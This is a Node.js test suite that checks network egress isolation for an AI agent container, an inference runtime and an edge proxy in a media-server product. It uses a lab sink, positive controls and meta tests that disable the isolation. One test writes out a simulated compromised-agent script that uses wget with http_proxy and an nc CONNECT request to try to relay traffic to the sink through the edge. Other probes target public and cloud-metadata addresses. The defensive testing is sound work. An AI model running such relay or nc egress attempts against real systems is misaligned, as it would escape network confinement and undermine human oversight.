/**
 * NET-01 (PR05 §3.4): a probe process in the network namespace (and with the
 * default capabilities) of each agent/runtime candidate tries TCP, UDP, DNS
 * direct and DNS through the configured resolver, IPv4 and IPv6, towards a lab
 * sink outside the evaluated processes. The verdict comes from the sink ledger
 * (capturer outside the candidates): zero deliveries for the candidate's token,
 * zero packets from the candidate's addresses, no default route.
 *
 * Topology: the compose file the product generates for each strict profile
 * (lab/topology.mjs documents the overlay). The sink is the upstream resolver of
 * Docker's embedded DNS for the candidates, so `secret.<sink zone>` resolution
 * through the permitted resolver would show up as a QNAME in its ledger.
 *
 * Every oracle can fail: the positive control proves the sink and the capture
 * see every form of delivery from a namespace that has a route, and the meta
 * tests run the same probe against throwaway copies where the rule is disabled
 * (candidates attached to a non-internal network, or `internal: true` removed)
 * and require the oracle to turn red.
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { uniqueName } from './lab/docker-lab.mjs';
import { startTopology, deliveriesOf, OFFLINE, ONLINE } from './lab/topology.mjs';

const ATTEMPTS = ['tcp-sink-80', 'tcp-sink-8080', 'tcp-public', 'tcp-metadata', 'udp-sink', 'dns-direct', 'dns-indirect'];
const ROUTES = ['ipv4-default-route', 'ipv6-default-route', 'ipv6-global-address'];
const ALL_FORMS = ['dns-direct', 'dns-indirect', 'tcp-sink-80', 'tcp-sink-8080', 'udp-sink'];

function assertProbeRan(probe, where) {
  for (const k of [...ATTEMPTS, ...ROUTES]) {
    assert.ok(k in probe.results, `${where}: the probe did not report ${k} (it did not run completely): ${probe.stdout} ${probe.stderr}`);
  }
}

/** Zero deliveries for the token, zero packets from the candidate, no route out. */
function assertConfined(t, service, probe, token) {
  assertProbeRan(probe, service);
  const ledger = t.ledger();
  const delivered = deliveriesOf(ledger, token);
  assert.deepEqual(delivered.kinds, [], `${service}: the sink received ${delivered.kinds.join(', ')} for this probe: ${JSON.stringify(delivered.entries).slice(0, 1500)}`);
  const ips = new Set(t.ips(service));
  const fromCandidate = ledger.filter((e) => e.src && ips.has(e.src));
  assert.deepEqual(fromCandidate, [], `${service}: the sink saw traffic from the candidate's addresses ${[...ips].join(', ')}`);
  for (const k of ROUTES) assert.equal(probe.results[k], 'absent', `${service}: ${k} is present in the candidate namespace`);
  // The public and metadata attempts cannot reach the sink; the probe's own result is the evidence.
  assert.equal(probe.results['tcp-public'], 'blocked', `${service}: reached a public address`);
  assert.equal(probe.results['tcp-metadata'], 'blocked', `${service}: reached the cloud metadata address`);
}

function listeners(netstat) {
  const tcp = [];
  const udp = [];
  for (const line of netstat.split('\n')) {
    const cols = line.trim().split(/\s+/);
    if (cols.length < 4) continue;
    const local = cols[3];
    if (local.startsWith('127.0.0.11:')) continue; // Docker's embedded DNS listener
    const port = Number(local.split(':').pop());
    if (cols[0].startsWith('tcp') && line.includes('LISTEN')) tcp.push(port);
    if (cols[0].startsWith('udp')) udp.push(port);
  }
  return { tcp: [...new Set(tcp)].sort((a, b) => a - b), udp: [...new Set(udp)].sort((a, b) => a - b) };
}

for (const profile of [OFFLINE, ONLINE]) {
  describe(`NET-01 (${profile}): no egress from the agent, runtime or edge namespaces`, { timeout: 1_800_000 }, () => {
    let t;

    before(async () => {
      t = await startTopology({ profile, label: profile === OFFLINE ? 'n1off' : 'n1onl' });
    });

    after(async () => {
      await t?.down();
    });

    it('positive control: a namespace with a route delivers TCP, UDP, direct and indirect DNS to the sink', async (ctx) => {
      const token = uniqueName('n1ctl');
      const probe = await t.controlProbe(token);
      assertProbeRan(probe, 'control');
      const delivered = deliveriesOf(t.ledger(), token);
      ctx.diagnostic(`control delivered: ${delivered.kinds.join(', ')} (${delivered.entries.length} ledger entries)`);
      for (const form of ALL_FORMS) assert.ok(delivered.kinds.includes(form), `the capture missed ${form} from the control namespace: ${probe.stdout}`);
      assert.equal(probe.results['ipv4-default-route'], 'present');
    });

    if (profile === ONLINE) {
      it('positive control: authorised components on mediabox-external-net reach the sink', async (ctx) => {
        for (const service of ['prowlarr', 'qbittorrent']) {
          const token = uniqueName(`n1${service.slice(0, 4)}`);
          const probe = await t.probe(service, token);
          const delivered = deliveriesOf(t.ledger(), token);
          ctx.diagnostic(`${service} delivered: ${delivered.kinds.join(', ')}`);
          for (const form of ['tcp-sink-80', 'tcp-sink-8080', 'udp-sink', 'dns-direct']) {
            assert.ok(delivered.kinds.includes(form), `${service} is an authorised component and should reach the sink (${form}): ${probe.stdout}`);
          }
        }
      });
    }

    it('mcp-server namespace: zero deliveries (including DNS through the configured resolver), no default route', async (ctx) => {
      const token = uniqueName('n1mcp');
      const probe = await t.probe('mcp-server', token);
      ctx.diagnostic(`mcp-server probe: ${JSON.stringify(probe.results)}`);
      assertConfined(t, 'mcp-server', probe, token);
    });

    it('inference namespace: zero deliveries (including DNS through the configured resolver), no default route', async (ctx) => {
      const token = uniqueName('n1inf');
      const probe = await t.probe('mediabox-inference', token);
      ctx.diagnostic(`inference probe: ${JSON.stringify(probe.results)}`);
      assertConfined(t, 'mediabox-inference', probe, token);
    });

    it('edge: nothing reaches the sink from it or through it, and it only listens on its three fixed forwarders', async (ctx) => {
      const token = uniqueName('n1edg');
      const probe = await t.probe('mediabox-edge', token);
      assertProbeRan(probe, 'mediabox-edge');
      const ledger = t.ledger();
      assert.deepEqual(deliveriesOf(ledger, token).kinds, [], 'the edge namespace delivered to the sink');
      const ips = new Set(t.ips('mediabox-edge'));
      assert.deepEqual(ledger.filter((e) => ips.has(e.src)), [], 'the sink saw traffic from the edge');

      const netstat = await t.sh('mediabox-edge', 'netstat -ltnu');
      const open = listeners(netstat.stdout);
      ctx.diagnostic(`edge listeners: ${JSON.stringify(open)}`);
      assert.deepEqual(open.tcp, [3000, 8096, 8920], `the edge must only run its fixed forwarders: ${netstat.stdout}`);
      assert.deepEqual(open.udp, [], `the edge must not listen on UDP: ${netstat.stdout}`);

      // A compromised agent trying to use the edge as a proxy only ever reaches the fixed targets.
      const via = uniqueName('n1via');
      const script = [3000, 8096, 8920].map((p) => [
        `http_proxy=http://mediabox-edge:${p} wget -T 3 -q -O- http://${t.sinkIp}/${via}-p${p} >/dev/null 2>&1`,
        `printf 'CONNECT ${t.sinkIp}:80 HTTP/1.1\\r\\nHost: ${t.sinkIp}:80\\r\\n\\r\\nGET /${via}-c${p} HTTP/1.1\\r\\nHost: ${t.sinkIp}\\r\\n\\r\\n' | nc -w 3 mediabox-edge ${p} >/dev/null 2>&1`,
      ].join('; ')).join('; ');
      await t.sh('mcp-server', `${script}; echo done`);
      assert.deepEqual(deliveriesOf(t.ledger(), via).kinds, [], 'a request relayed through the edge reached the sink');
      const jellyfinSaw = t.requestLog('jellyfin').filter((e) => String(e.path).includes(via));
      assert.ok(jellyfinSaw.length > 0, 'stimulus not applied: the proxy-style request did not reach the edge\'s fixed jellyfin target');
    });
  });
}

describe('NET-01 meta: with the isolation rule disabled the same oracle turns red', { timeout: 1_800_000 }, () => {
  for (const profile of [OFFLINE, ONLINE]) {
    it(`${profile} copy with mcp-server and the runtime attached to a non-internal network: deliveries observed`, async (ctx) => {
      const outside = profile === ONLINE ? 'mediabox-external-net' : 'lab-outside';
      const m = await startTopology({
        profile,
        label: profile === OFFLINE ? 'n1moff' : 'n1monl',
        only: ['lab-sink', 'mediabox-inference', 'mcp-server'],
        attach: { 'mcp-server': [outside], 'mediabox-inference': [outside] },
      });
      try {
        for (const service of ['mcp-server', 'mediabox-inference']) {
          const token = uniqueName('n1red');
          const probe = await m.probe(service, token);
          assertProbeRan(probe, service);
          const delivered = deliveriesOf(m.ledger(), token);
          ctx.diagnostic(`${service} with the rule disabled delivered: ${delivered.kinds.join(', ')}`);
          for (const form of ALL_FORMS) {
            assert.ok(delivered.kinds.includes(form), `with the rule disabled the oracle must see ${form} from ${service}: ${probe.stdout}`);
          }
          assert.equal(probe.results['ipv4-default-route'], 'present');
        }
      } finally {
        await m.down();
      }
    });
  }

  it('offline-library copy without `internal: true`: the candidates get a default route', async (ctx) => {
    const m = await startTopology({ profile: OFFLINE, label: 'n1mint', only: ['lab-sink', 'mediabox-inference', 'mcp-server'], disableInternal: true });
    try {
      for (const service of ['mcp-server', 'mediabox-inference']) {
        const probe = await m.probe(service, uniqueName('n1int'));
        assertProbeRan(probe, service);
        ctx.diagnostic(`${service} without internal networks: ${JSON.stringify(probe.results)}`);
        assert.equal(probe.results['ipv4-default-route'], 'present', `removing internal: true must give ${service} a route out`);
      }
    } finally {
      await m.down();
    }
  });
});
